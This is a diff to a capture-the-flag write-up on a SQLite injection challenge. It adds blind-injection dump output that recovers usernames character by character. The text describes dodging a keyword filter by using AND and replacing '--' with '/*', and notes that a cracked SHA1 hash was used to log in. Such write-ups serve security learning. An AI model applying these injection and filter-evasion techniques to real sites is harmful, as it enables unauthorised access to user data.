@@ -91,7 +91,79 @@
 ---------------------
 
 - The site is vulnerable to sqlite3 injection and it filters important chars like `or` and `--`.My teammates discovered a user `test` which made it easier to use `AND` and also replaced `--` with `/*`.
-- After enum for a long time,I discovered columns for `stats` and `database`.I focused more on dumping `database` with my script.To avoid wasting time, we'll focus solely on column `user` and `pass`.The crucial user in this chall is `tuxlikeslowercaseletters`.
+- After enum for a long time,I discovered columns for `stats` and `database`.I focused more on dumping `database` with my script.To avoid wasting time, we'll focus solely on column `user` and `pass`.The crucial user in this chall is `tuxtheflagmasteronlylikeslowercaseletters`.User's dump-:
+
+```bash
+[+] Number of tables-:2
+[+] Number of Data's strings-:4
+[+]Dumping String:table:database:column:user
+[+]Finding String Length
+[+] String-Length:-:3
+[+] Found Char:-:Y
+[+] Found Char:-:o
+[+] Found Char:-:u
+[+] Column user dumped::You
+[+]Finding String Length
+[+] String-Length:-:4
+[+] Found Char:-:t
+[+] Found Char:-:e
+[+] Found Char:-:s
+[+] Found Char:-:t
+[+] Column user dumped::test
+[+]Finding String Length
+[+] String-Length:-:41
+[+] Found Char:-:t
+[+] Found Char:-:u
+[+] Found Char:-:x
+[+] Found Char:-:t
+[+] Found Char:-:h
+[+] Found Char:-:e
+[+] Found Char:-:f
+[+] Found Char:-:l
+[+] Found Char:-:a
+[+] Found Char:-:g
+[+] Found Char:-:m
+[+] Found Char:-:a
+[+] Found Char:-:s
+[+] Found Char:-:t
+[+] Found Char:-:e
+[+] Found Char:-:r
+[+] Found Char:-:o
+[+] Found Char:-:n
+[+] Found Char:-:l
+[+] Found Char:-:y
+[+] Found Char:-:l
+[+] Found Char:-:i
+[+] Found Char:-:k
+[+] Found Char:-:e
+[+] Found Char:-:s
+[+] Found Char:-:l
+[+] Found Char:-:o
+[+] Found Char:-:w
+[+] Found Char:-:e
+[+] Found Char:-:r
+[+] Found Char:-:c
+[+] Found Char:-:a
+[+] Found Char:-:s
+[+] Found Char:-:e
+[+] Found Char:-:l
+[+] Found Char:-:e
+[+] Found Char:-:t
+[+] Found Char:-:t
+[+] Found Char:-:e
+[+] Found Char:-:r
+[+] Found Char:-:s
+[+] Column user dumped::tuxtheflagmasteronlylikeslowercaseletters
+[+]Finding String Length
+[+] String-Length:-:6
+[+] Found Char:-:h
+[+] Found Char:-:u
+[+] Found Char:-:m
+[+] Found Char:-:a
+[+] Found Char:-:n
+[+] Found Char:-:A
+[+] Column user dumped::humanA
+```
 
 - My team mate cracked the hash which is sha1 for `allsgud` which allowed him to login and get the flag.
 
